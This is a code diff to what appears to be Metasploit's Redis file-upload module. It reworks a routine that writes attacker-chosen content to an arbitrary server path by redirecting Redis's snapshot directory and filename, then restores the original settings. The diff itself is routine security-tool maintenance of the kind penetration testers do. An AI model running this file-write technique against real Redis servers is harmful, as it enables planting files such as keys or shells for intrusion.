@@ -50,76 +50,90 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_file(path, content)
-    # XXX: refactor this to handle redis errors or exceptions in a cleaner manner
-
+    changed_config = {}
+    temporary_key = nil
+    uploaded = false
     dirname = File.dirname(path)
     basename = File.basename(path)
 
-    # Get the currently configured dir and dbfilename before we overwrite them;
-    # we should set them back to their original values after we are done.
-    # XXX: this is a hack -- we should really parse the responses more correctly
-    original_dir = (redis_command('CONFIG', 'GET', 'dir') || '').split(/\r\n/).last
-    original_dbfilename = (redis_command('CONFIG', 'GET', 'dbfilename') || '').split(/\r\n/).last
-    if datastore['DISABLE_RDBCOMPRESSION']
-      original_rdbcompression = (redis_command('CONFIG', 'GET', 'rdbcompression') || '').split(/\r\n/).last
+    original_config = {}
+    settings = %w[dir dbfilename]
+    settings << 'rdbcompression' if datastore['DISABLE_RDBCOMPRESSION']
+    settings.each do |name|
+      response = redis_command('CONFIG', 'GET', name)
+      fields = response && parse_config_reply(response)
+      unless fields&.first == name
+        print_error("Failed to read Redis #{name} configuration: #{redis_response_detail(response)}")
+        return false
+      end
+      original_config[name] = fields[1]
     end
 
-    # set the directory which stores the current redis local store
-    data = redis_command('CONFIG', 'SET', 'dir', dirname) || ''
-    return unless data.include?('+OK')
+    # Track attempted changes too: a lost reply does not prove CONFIG SET failed.
+    changed_config['dir'] = original_config['dir']
+    return false unless redis_upload_command('set the Redis snapshot directory', 'CONFIG', 'SET', 'dir', dirname)
 
-    # set the file name, relative to the above directory name, that is the redis local store
-    data = redis_command('CONFIG', 'SET', 'dbfilename', basename) || ''
-    return unless data.include?('+OK')
+    changed_config['dbfilename'] = original_config['dbfilename']
+    return false unless redis_upload_command('set the Redis snapshot filename', 'CONFIG', 'SET', 'dbfilename', basename)
 
-    # Compression string objects using LZF when dump .rdb databases ?
-    # For default that's set to 'yes' as it's almost always a win.
-    # If you want to save some CPU in the saving child set it to 'no' but
-    # the dataset will likely be bigger if you have compressible values or
-    # keys.
-    if datastore['DISABLE_RDBCOMPRESSION'] && original_rdbcompression.upcase == 'YES'
-      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no') || ''
-      if data.include?('+OK')
-        reset_rdbcompression = true
-      else
-        print_error("#{peer} -- Unable to disable rdbcompresssion")
-        reset_rdbcompression = false
-      end
+    if datastore['DISABLE_RDBCOMPRESSION'] && original_config['rdbcompression'].casecmp?('yes')
+      changed_config['rdbcompression'] = original_config['rdbcompression']
+      return false unless redis_upload_command('disable Redis snapshot compression', 'CONFIG', 'SET', 'rdbcompression', 'no')
     end
 
     if datastore['FLUSHALL']
-      data = redis_command('FLUSHALL') || ''
-      unless data.include?('+OK')
-        print_warning("#{peer} -- failed to flushall(); continuing")
+      response = redis_command('FLUSHALL')
+      unless response == '+OK'
+        print_warning("Failed to flush Redis data; continuing: #{redis_response_detail(response)}")
       end
     end
 
-    # set a key in this db that contains our content
-    # XXX: this does not work well (at all) if the content we are uploading is
-    # multiline.  It also probably doesn't work well if the content isn't
-    # simple ASCII text
     key = Rex::Text.rand_text_alpha(32)
-    data = redis_command('SET', key, content) || ''
-    return unless data.include?('+OK')
+    # SETNX prevents a collision from overwriting, then deleting, an existing key.
+    return false unless redis_upload_command("create temporary Redis key #{key}", 'SETNX', key, content, expected: ':1')
 
-    data = redis_command('SAVE') || ''
+    temporary_key = key
+    return false unless redis_upload_command("save #{content.size} bytes to #{path}", 'SAVE')
 
-    if data.include?('+OK')
-      print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
+    uploaded = true
+    print_good("Saved #{content.size} bytes inside of redis DB at #{path}")
+    true
+  ensure
+    restore_redis_upload_state(changed_config, temporary_key, uploaded)
+  end
+
+  def restore_redis_upload_state(changed_config, temporary_key, uploaded)
+    # Attempt every restoration even when an earlier one fails.
+    restored = changed_config.map do |name, value|
+      redis_upload_command("restore Redis #{name}", 'CONFIG', 'SET', name, value, cleanup: true)
+    end.all?
+    removed = !temporary_key || redis_upload_command('remove the temporary Redis key', 'DEL', temporary_key, expected: /\A:[01]\z/, cleanup: true)
+    return unless uploaded
+
+    if restored && removed
+      redis_upload_command('save the cleaned Redis database', 'SAVE', cleanup: true)
     else
-      print_error("#{peer} -- failed to save #{content.size} bytes to #{path} (permissions?)")
-      return
+      print_warning('Skipped saving the cleaned Redis database because cleanup is incomplete')
     end
+  end
 
-    # cleanup
-    # XXX: ensure that these get sent if we prematurely return if a previous command fails
-    redis_command('CONFIG', 'SET', 'dir', original_dir)
-    redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
-    if datastore['DISABLE_RDBCOMPRESSION'] && reset_rdbcompression
-      redis_command('CONFIG', 'SET', 'rdbcompression', original_rdbcompression)
-    end
-    redis_command('DEL', key)
-    redis_command('SAVE')
+  def redis_upload_command(operation, *command, expected: '+OK', cleanup: false)
+    response = redis_command(*command)
+    matches = expected.is_a?(Regexp) ? expected.match?(response.to_s) : response == expected
+    return true if matches
+
+    message = "Failed to #{operation}: #{redis_response_detail(response)}"
+    cleanup ? print_warning(message) : print_error(message)
+    false
+  rescue Rex::ConnectionError, IOError, Errno::ECONNRESET, Errno::EPIPE, ::Timeout::Error, Msf::Auxiliary::Failed => e
+    elog("Failed to #{operation}", error: e)
+    message = "Failed to #{operation}: #{e.class}: #{e.message}"
+    cleanup ? print_warning(message) : print_error(message)
+    false
+  end
+
+  def redis_response_detail(response)
+    response ? printable_redis_response(response, false) : 'No response from Redis'
   end
 
   def check_host(_ip)
